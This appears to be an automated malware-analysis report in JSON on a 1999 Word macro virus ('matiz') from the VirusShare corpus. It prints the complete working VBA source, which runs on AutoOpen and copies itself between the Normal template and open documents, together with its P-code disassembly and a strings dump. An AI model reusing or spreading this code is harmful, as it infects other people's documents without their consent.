{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"matiz\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "CodeModule": "May attempt to modify the VBA code",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\n\nFunction MatizMe()\nOn Error Resume Next\n\nSet MyHost_ = MyHost\nSet MyNewHost_ = MyNewHost\nActiveHost_ = ActiveHost\n\nSet MyHost = Nothing\nSet MyNewHost = Nothing\n\n\nCheckRefNormal\nCheckRefActive\n\n\nIf AmINormInstalled = False Then\n    If CheckNormHost = False Then\n        MyNewHost.Add (vbext_ct_StdModule)\n        MyNewHost(\"Modul1\").Name = \"Office_\"\n        NormHostName_ = \"Office_\"\n    Else\n        NormHostName_ = NormHostName\n    End If\n    \n    Our1Line% = Find1Line\n    \n    VirusLines% = (MyHost_(ActiveHost_).CodeModule.CountOfLines - Our1Line)\n    VirusCode$ = MyHost_(ActiveHost_).CodeModule.Lines(Our1Line, VirusLines%)\n    HostLines% = MyNewHost_(NormHostName_).CodeModule.CountOfLines\n    MyNewHost(NormHostName_).CodeModule.InsertLines (HostLines% + 1), VirusCode$\n    \nEnd If\n    \nIf AmIActInstalled = False Then\n    If CheckDokHost = False Then\n        MyNewHost.Add (vbext_ct_StdModule)\n        MyNewHost(\"Modul1\").Name = \"Office_\"\n        DokHostName_ = \"Office_\"\n    Else\n        DokHostName_ = DokHostName\n    End If\n    \n    Our1Line% = Find1Line\n    \n    VirusLines% = (MyHost_(ActiveHost_).CodeModule.CountOfLines - Our1Line)\n    VirusCode$ = MyHost_(ActiveHost_).CodeModule.Lines(Our1Line, VirusLines%)\n    HostLines% = MyNewHost_(DokHostName_).CodeModule.CountOfLines\n    MyNewHost(DokHostName_).CodeModule.InsertLines (HostLines% + 1), VirusCode$\n\nEnd If\nEnd Function\n\nFunction MyHost() As Object\n\nIf MacroContainer = NormalTemplate Then Set MyHost = NormalTemplate.VBProject.VBComponents\nIf MacroContainer = ActiveDocument Then Set MyHost = ActiveDocument.VBProject.VBComponents\n\nEnd Function\n\nFunction MyNewHost() As Object\n\nIf MacroContainer = NormalTemplate Then Set MyNewHost = ActiveDocument.VBProject.VBComponents\nIf MacroContainer = ActiveDocument Then Set MyNewHost = NormalTemplate.VBProject.VBComponents\n\nEnd Function\n\nFunction ActiveHost() As String\nFor i = 1 To NormalTemplate.VBProject.VBComponents.Count\n         \n    For iq = 1 To NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines\n        If Left(NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(iq, 1), 18) = \"Function MatizMe()\" Then\n            ActiveHost = NormalTemplate.VBProject.VBComponents(i).Name\n            Exit Function\n        End If\n    Next iq\n         \nNext i\n\nFor j = 1 To ActiveDocument.VBProject.VBComponents.Count\n\n    For icq = 1 To ActiveDocument.VBProject.VBComponents(j).CodeModule.CountOfLines\n        If Left(ActiveDocument.VBProject.VBComponents(j).CodeModule.Lines(icq, 1), 18) = \"Function MatizMe()\" Then\n            ActiveHost = ActiveDocument.VBProject.VBComponents(j).Name\n            Exit Function\n        End If\n    Next icq\n                          \nNext j\n\nEnd Function\n\nFunction AmINormInstalled() As Boolean\n\nAmINormInstalled = False\n\nFor i = 1 To NormalTemplate.VBProject.VBComponents.Count\n\nFor iq = 1 To NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines\n    If Left(NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(iq, 1), 18) = \"Function MatizMe()\" Then\n        AmINormInstalled = True\n        Exit Function\n    End If\nNext iq\n\nNext i\n\nEnd Function\n\nFunction AmIActInstalled() As Boolean\n\nAmIActInstalled = False\n\nFor i = 1 To ActiveDocument.VBProject.VBComponents.Count\n\nFor icq = 1 To ActiveDocument.VBProject.VBComponents(i).CodeModule.CountOfLines\n    If Left(ActiveDocument.VBProject.VBComponents(i).CodeModule.Lines(icq, 1), 18) = \"Function MatizMe()\" Then\n        AmIActInstalled = True\n        Exit Function\n    End If\nNext icq\n\nNext i\n\nEnd Function\n\nFunction CheckDokHost() As Boolean\n\nCheckDokHost = False\n\nCheckItem = ActiveDocument.VBProject.VBComponents.Count\n\nIf CheckItem > 1 Then\n    For i = 1 To CheckItem\n        If ActiveDocument.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then\n            CheckDokHost = True\n            Exit Function\n        End If\n    Next i\nEnd If\n\nEnd Function\n\nFunction DokHostName() As String\n\nCheckItem = ActiveDocument.VBProject.VBComponents.Count\n\nIf CheckItem > 1 Then\n    For i = 1 To CheckItem\n        If ActiveDocument.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then\n            DokHostName = ActiveDocument.VBProject.VBComponents(i).Name\n            Exit Function\n        End If\n    Next i\nEnd If\n\nEnd Function\nFunction CheckNormHost() As Boolean\n\nCheckNormHost = False\n\nCheckItem = NormalTemplate.VBProject.VBComponents.Count\nIf CheckItem > 1 Then\n    For i = 1 To CheckItem\n        If NormalTemplate.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then\n            CheckNormHost = True\n            Exit Function\n        End If\n    Next i\nEnd If\n    \nEnd Function\n\nFunction NormHostName() As String\nCheckItem = NormalTemplate.VBProject.VBComponents.Count\nIf CheckItem > 1 Then\n    For i = 1 To CheckItem\n        If NormalTemplate.VBProject.VBComponents(i).Type = vbext_ct_StdModule Then\n            NormHostName = NormalTemplate.VBProject.VBComponents(i).Name\n            Exit Function\n        End If\n    Next i\nEnd If\n\nEnd Function\n\nFunction CheckRefNormal()\nCheckRefNormal = False\n\nFor i = 1 To NormalTemplate.VBProject.References.Count\n    If NormalTemplate.VBProject.References(i).Name = \"VBIDE\" Then CheckRefNormal = True\nNext\n\nIf CheckRefNormal = False Then\n    NormalTemplate.VBProject.References.AddFromGuid \"{0002E157-0000-0000-C000-000000000046}\", 1, 0\nEnd If\n\nEnd Function\n\nFunction CheckRefActive()\nCheckRefActive = False\n\nFor i = 1 To ActiveDocument.VBProject.References.Count\n    If ActiveDocument.VBProject.References(i).Name = \"VBIDE\" Then CheckRefActive = True\nNext\n\nIf CheckRefActive = False Then\n    ActiveDocument.VBProject.References.AddFromGuid \"{0002E157-0000-0000-C000-000000000046}\", 1, 0\nEnd If\n\nEnd Function\n\nFunction Find1Line() As Integer\nFind1Line = 0\n\nFor i = 1 To MyHost(ActiveHost).CodeModule.CountOfLines\n    If Left(MyHost(ActiveHost).CodeModule.Lines(i, 1), 18) = \"Function MatizMe()\" Then\n        Find1Line = i\n        Exit Function\n    End If\nNext\nEnd Function\n\nSub AutoOpen()\nMatizMe\nEnd Sub\n\n\n\n' Processing file: VirusShare_12f4be89b957e971b274fcbadd1e0856\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 1519 bytes\n' Macros/VBA/matiz - 19740 bytes\n' Line #0:\n' \tFuncDefn (Function MatizMe())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' Line #3:\n' \tSetStmt \n' \tLd MyHost \n' \tSet MyHost_ \n' Line #4:\n' \tSetStmt \n' \tLd MyNewHost \n' \tSet MyNewHost_ \n' Line #5:\n' \tLd ActiveHost \n' \tSt ActiveHost_ \n' Line #6:\n' Line #7:\n' \tSetStmt \n' \tLitNothing \n' \tSet MyHost \n' Line #8:\n' \tSetStmt \n' \tLitNothing \n' \tSet MyNewHost \n' Line #9:\n' Line #10:\n' Line #11:\n' \tArgsCall CheckRefNormal 0x0000 \n' Line #12:\n' \tArgsCall CheckRefActive 0x0000 \n' Line #13:\n' Line #14:\n' Line #15:\n' \tLd AmINormInstalled \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #16:\n' \tLd CheckNormHost \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #17:\n' \tLd vbext_ct_StdModule \n' \tParen \n' \tLd MyNewHost \n' \tArgsMemCall Add 0x0001 \n' Line #18:\n' \tLitStr 0x0007 \"Office_\"\n' \tLitStr 0x0006 \"Modul1\"\n' \tArgsLd MyNewHost 0x0001 \n' \tMemSt New \n' Line #19:\n' \tLitStr 0x0007 \"Office_\"\n' \tSt NormHostName_ \n' Line #20:\n' \tElseBlock \n' Line #21:\n' \tLd NormHostName \n' \tSt NormHostName_ \n' Line #22:\n' \tEndIfBlock \n' Line #23:\n' Line #24:\n' \tLd Find1Line \n' \tSt Our1Line% \n' Line #25:\n' Line #26:\n' \tLd ActiveHost_ \n' \tArgsLd MyHost_ 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd Our1Line \n' \tSub \n' \tParen \n' \tSt VirusLines% \n' Line #27:\n' \tLd Our1Line \n' \tLd VirusLines% \n' \tLd ActiveHost_ \n' \tArgsLd MyHost_ 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt VirusCode$ \n' Line #28:\n' \tLd NormHostName_ \n' \tArgsLd MyNewHost_ 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt HostLines% \n' Line #29:\n' \tLd HostLines% \n' \tLitDI2 0x0001 \n' \tAdd \n' \tParen \n' \tLd VirusCode$ \n' \tLd NormHostName_ \n' \tArgsLd MyNewHost 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #30:\n' Line #31:\n' \tEndIfBlock \n' Line #32:\n' Line #33:\n' \tLd AmIActInstalled \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #34:\n' \tLd CheckDokHost \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #35:\n' \tLd vbext_ct_StdModule \n' \tParen \n' \tLd MyNewHost \n' \tArgsMemCall Add 0x0001 \n' Line #36:\n' \tLitStr 0x0007 \"Office_\"\n' \tLitStr 0x0006 \"Modul1\"\n' \tArgsLd MyNewHost 0x0001 \n' \tMemSt New \n' Line #37:\n' \tLitStr 0x0007 \"Office_\"\n' \tSt DokHostName_ \n' Line #38:\n' \tElseBlock \n' Line #39:\n' \tLd DokHostName \n' \tSt DokHostName_ \n' Line #40:\n' \tEndIfBlock \n' Line #41:\n' Line #42:\n' \tLd Find1Line \n' \tSt Our1Line% \n' Line #43:\n' Line #44:\n' \tLd ActiveHost_ \n' \tArgsLd MyHost_ 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLd Our1Line \n' \tSub \n' \tParen \n' \tSt VirusLines% \n' Line #45:\n' \tLd Our1Line \n' \tLd VirusLines% \n' \tLd ActiveHost_ \n' \tArgsLd MyHost_ 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tSt VirusCode$ \n' Line #46:\n' \tLd DokHostName_ \n' \tArgsLd MyNewHost_ 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tSt HostLines% \n' Line #47:\n' \tLd HostLines% \n' \tLitDI2 0x0001 \n' \tAdd \n' \tParen \n' \tLd VirusCode$ \n' \tLd DokHostName_ \n' \tArgsLd MyNewHost 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemCall InsertLines 0x0002 \n' Line #48:\n' Line #49:\n' \tEndIfBlock \n' Line #50:\n' \tEndFunc \n' Line #51:\n' Line #52:\n' \tFuncDefn (Function MyHost() As Object)\n' Line #53:\n' Line #54:\n' \tLd MacroContainer \n' \tLd NormalTemplate \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tSet MyHost \n' \tEndIf \n' Line #55:\n' \tLd MacroContainer \n' \tLd ActiveDocument \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tSet MyHost \n' \tEndIf \n' Line #56:\n' Line #57:\n' \tEndFunc \n' Line #58:\n' Line #59:\n' \tFuncDefn (Function MyNewHost() As Object)\n' Line #60:\n' Line #61:\n' \tLd MacroContainer \n' \tLd NormalTemplate \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tSet MyNewHost \n' \tEndIf \n' Line #62:\n' \tLd MacroContainer \n' \tLd ActiveDocument \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tSet MyNewHost \n' \tEndIf \n' Line #63:\n' Line #64:\n' \tEndFunc \n' Line #65:\n' Line #66:\n' \tFuncDefn (Function ActiveHost() As String)\n' Line #67:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #68:\n' Line #69:\n' \tStartForVariable \n' \tLd iq \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #70:\n' \tLd iq \n' \tLitDI2 0x0001 \n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0012 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0012 \"Function MatizMe()\"\n' \tEq \n' \tIfBlock \n' Line #71:\n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tSt ActiveHost \n' Line #72:\n' \tExitFunc \n' Line #73:\n' \tEndIfBlock \n' Line #74:\n' \tStartForVariable \n' \tLd iq \n' \tEndForVariable \n' \tNextVar \n' Line #75:\n' Line #76:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #77:\n' Line #78:\n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #79:\n' Line #80:\n' \tStartForVariable \n' \tLd icq \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd j \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #81:\n' \tLd icq \n' \tLitDI2 0x0001 \n' \tLd j \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0012 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0012 \"Function MatizMe()\"\n' \tEq \n' \tIfBlock \n' Line #82:\n' \tLd j \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tSt ActiveHost \n' Line #83:\n' \tExitFunc \n' Line #84:\n' \tEndIfBlock \n' Line #85:\n' \tStartForVariable \n' \tLd icq \n' \tEndForVariable \n' \tNextVar \n' Line #86:\n' Line #87:\n' \tStartForVariable \n' \tLd j \n' \tEndForVariable \n' \tNextVar \n' Line #88:\n' Line #89:\n' \tEndFunc \n' Line #90:\n' Line #91:\n' \tFuncDefn (Function AmINormInstalled() As Boolean)\n' Line #92:\n' Line #93:\n' \tLitVarSpecial (False)\n' \tSt AmINormInstalled \n' Line #94:\n' Line #95:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #96:\n' Line #97:\n' \tStartForVariable \n' \tLd iq \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #98:\n' \tLd iq \n' \tLitDI2 0x0001 \n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0012 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0012 \"Function MatizMe()\"\n' \tEq \n' \tIfBlock \n' Line #99:\n' \tLitVarSpecial (True)\n' \tSt AmINormInstalled \n' Line #100:\n' \tExitFunc \n' Line #101:\n' \tEndIfBlock \n' Line #102:\n' \tStartForVariable \n' \tLd iq \n' \tEndForVariable \n' \tNextVar \n' Line #103:\n' Line #104:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #105:\n' Line #106:\n' \tEndFunc \n' Line #107:\n' Line #108:\n' \tFuncDefn (Function AmIActInstalled() As Boolean)\n' Line #109:\n' Line #110:\n' \tLitVarSpecial (False)\n' \tSt AmIActInstalled \n' Line #111:\n' Line #112:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tFor \n' Line #113:\n' Line #114:\n' \tStartForVariable \n' \tLd icq \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd i \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #115:\n' \tLd icq \n' \tLitDI2 0x0001 \n' \tLd i \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0012 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0012 \"Function MatizMe()\"\n' \tEq \n' \tIfBlock \n' Line #116:\n' \tLitVarSpecial (True)\n' \tSt AmIActInstalled \n' Line #117:\n' \tExitFunc \n' Line #118:\n' \tEndIfBlock \n' Line #119:\n' \tStartForVariable \n' \tLd icq \n' \tEndForVariable \n' \tNextVar \n' Line #120:\n' Line #121:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #122:\n' Line #123:\n' \tEndFunc \n' Line #124:\n' Line #125:\n' \tFuncDefn (Function CheckDokHost() As Boolean)\n' Line #126:\n' Line #127:\n' \tLitVarSpecial (False)\n' \tSt CheckDokHost \n' Line #128:\n' Line #129:\n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tSt CheckItem \n' Line #130:\n' Line #131:\n' \tLd CheckItem \n' \tLitDI2 0x0001 \n' \tGt \n' \tIfBlock \n' Line #132:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd CheckItem \n' \tFor \n' Line #133:\n' \tLd i \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd TypeOf \n' \tLd vbext_ct_StdModule \n' \tEq \n' \tIfBlock \n' Line #134:\n' \tLitVarSpecial (True)\n' \tSt CheckDokHost \n' Line #135:\n' \tExitFunc \n' Line #136:\n' \tEndIfBlock \n' Line #137:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #138:\n' \tEndIfBlock \n' Line #139:\n' Line #140:\n' \tEndFunc \n' Line #141:\n' Line #142:\n' \tFuncDefn (Function DokHostName() As String)\n' Line #143:\n' Line #144:\n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tSt CheckItem \n' Line #145:\n' Line #146:\n' \tLd CheckItem \n' \tLitDI2 0x0001 \n' \tGt \n' \tIfBlock \n' Line #147:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd CheckItem \n' \tFor \n' Line #148:\n' \tLd i \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd TypeOf \n' \tLd vbext_ct_StdModule \n' \tEq \n' \tIfBlock \n' Line #149:\n' \tLd i \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tSt DokHostName \n' Line #150:\n' \tExitFunc \n' Line #151:\n' \tEndIfBlock \n' Line #152:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #153:\n' \tEndIfBlock \n' Line #154:\n' Line #155:\n' \tEndFunc \n' Line #156:\n' \tFuncDefn (Function CheckNormHost() As Boolean)\n' Line #157:\n' Line #158:\n' \tLitVarSpecial (False)\n' \tSt CheckNormHost \n' Line #159:\n' Line #160:\n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tSt CheckItem \n' Line #161:\n' \tLd CheckItem \n' \tLitDI2 0x0001 \n' \tGt \n' \tIfBlock \n' Line #162:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd CheckItem \n' \tFor \n' Line #163:\n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd TypeOf \n' \tLd vbext_ct_StdModule \n' \tEq \n' \tIfBlock \n' Line #164:\n' \tLitVarSpecial (True)\n' \tSt CheckNormHost \n' Line #165:\n' \tExitFunc \n' Line #166:\n' \tEndIfBlock \n' Line #167:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #168:\n' \tEndIfBlock \n' Line #169:\n' Line #170:\n' \tEndFunc \n' Line #171:\n' Line #172:\n' \tFuncDefn (Function NormHostName() As String)\n' Line #173:\n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd VBComponents \n' \tMemLd Count \n' \tSt CheckItem \n' Line #174:\n' \tLd CheckItem \n' \tLitDI2 0x0001 \n' \tGt \n' \tIfBlock \n' Line #175:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd CheckItem \n' \tFor \n' Line #176:\n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd TypeOf \n' \tLd vbext_ct_StdModule \n' \tEq \n' \tIfBlock \n' Line #177:\n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tSt NormHostName \n' Line #178:\n' \tExitFunc \n' Line #179:\n' \tEndIfBlock \n' Line #180:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #181:\n' \tEndIfBlock \n' Line #182:\n' Line #183:\n' \tEndFunc \n' Line #184:\n' Line #185:\n' \tFuncDefn (Function CheckRefNormal())\n' Line #186:\n' \tLitVarSpecial (False)\n' \tSt CheckRefNormal \n' Line #187:\n' Line #188:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd References \n' \tMemLd Count \n' \tFor \n' Line #189:\n' \tLd i \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd References 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"VBIDE\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tSt CheckRefNormal \n' \tEndIf \n' Line #190:\n' \tStartForVariable \n' \tNext \n' Line #191:\n' Line #192:\n' \tLd CheckRefNormal \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #193:\n' \tLitStr 0x0026 \"{0002E157-0000-0000-C000-000000000046}\"\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0000 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tMemLd References \n' \tArgsMemCall AddFromGuid 0x0003 \n' Line #194:\n' \tEndIfBlock \n' Line #195:\n' Line #196:\n' \tEndFunc \n' Line #197:\n' Line #198:\n' \tFuncDefn (Function CheckRefActive())\n' Line #199:\n' \tLitVarSpecial (False)\n' \tSt CheckRefActive \n' Line #200:\n' Line #201:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd References \n' \tMemLd Count \n' \tFor \n' Line #202:\n' \tLd i \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd References 0x0001 \n' \tMemLd New \n' \tLitStr 0x0005 \"VBIDE\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tSt CheckRefActive \n' \tEndIf \n' Line #203:\n' \tStartForVariable \n' \tNext \n' Line #204:\n' Line #205:\n' \tLd CheckRefActive \n' \tLitVarSpecial (False)\n' \tEq \n' \tIfBlock \n' Line #206:\n' \tLitStr 0x0026 \"{0002E157-0000-0000-C000-000000000046}\"\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0000 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tMemLd References \n' \tArgsMemCall AddFromGuid 0x0003 \n' Line #207:\n' \tEndIfBlock \n' Line #208:\n' Line #209:\n' \tEndFunc \n' Line #210:\n' Line #211:\n' \tFuncDefn (Function Find1Line() As Integer)\n' Line #212:\n' \tLitDI2 0x0000 \n' \tSt Find1Line \n' Line #213:\n' Line #214:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd ActiveHost \n' \tArgsLd MyHost 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tFor \n' Line #215:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tLd ActiveHost \n' \tArgsLd MyHost 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLitDI2 0x0012 \n' \tArgsLd LBound 0x0002 \n' \tLitStr 0x0012 \"Function MatizMe()\"\n' \tEq \n' \tIfBlock \n' Line #216:\n' \tLd i \n' \tSt Find1Line \n' Line #217:\n' \tExitFunc \n' Line #218:\n' \tEndIfBlock \n' Line #219:\n' \tStartForVariable \n' \tNext \n' Line #220:\n' \tEndFunc \n' Line #221:\n' Line #222:\n' \tFuncDefn (Sub AutoOpen())\n' Line #223:\n' \tArgsCall MatizMe 0x0000 \n' Line #224:\n' \tEndSub \n' Line #225:\n' Line #226:\n"
    },
    "filename": "VirusShare_12f4be89b957e971b274fcbadd1e0856",
    "filesize": 48640,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Unbekannt, Template: Normal, Last Saved By: Unbekannt, Revision Number: 17, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sat Jun  5 15:13:00 1999, Last Saved Time/Date: Thu Jun 24 12:47:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "12f4be89b957e971b274fcbadd1e0856",
        "sha1": "efc1297213948593ed1eb364997ca1461816ac5c",
        "sha256": "f7c11e383e9c8ac0277e33019568398fa3952d8dcaf289357f689d1d3578bc74"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            ". A!",
            ",6o6",
            "Unbekannt",
            "Normal",
            "Unbekannt",
            "Microsoft Word 8.0",
            "Titel",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "matiz",
            "Sub AmINormInstalled",
            "Sub AmIActInstalled",
            "ame = ",
            "VBIDE",
            "{0002E157-0000-0000-C000-000000000046}",
            "VBIDE",
            "{0002E157-0000-0000-C000-000000000046}",
            "Function MatizMe()",
            "Sub MatizMe()",
            "Sub MatizMe()",
            "Function MatizMe()",
            "Function MatizMe()",
            "Office_",
            "Modul1$",
            "Attribute VB_Name = \"Office1\"",
            "Office_",
            "Modul1$",
            "Office_",
            "Office_",
            "Function MatizMe()",
            "Function MatizMe()",
            "Attribut",
            "e VB_Nam",
            "e = \"mat",
            "Function M",
            "Me()",
            " Error R",
            "Next",
            "Set MyHost_",
            "*New",
            "LNothing",
            "2Check",
            "RefNorma8l",
            "@If AmI",
            "nstalled",
            "#False Then",
            ".Add (vb",
            "_ct_StdModule",
            "1\").",
            "Office__",
            "En0d If",
            "Our1Line%",
            "VirTusA",
            "i_).Code",
            "untOf",
            "x - ",
            ", H\"",
            "dB\t&",
            "ert\tB",
            "+ 1)",
            "LaDok",
            "Ac\u0322Ax",
            " LL _LnesL",
            "!V\t:L@d",
            "`&0_( L",
            "LsdL",
            "() As Ob",
            "QMacroConta",
            "rLAealTempla@A ",
            ".VBPro",
            "Componen",
            "cDocnt",
            "1 To,",
            "cCv ",
            "(i/4`",
            "'LeftbV",
            "e.C:iq,",
            "Wh18)\t\".5\"",
            "Exit> 7(!",
            " irqx",
            "S\t1O",
            "Un8>38Boolea0OB",
            " /:W",
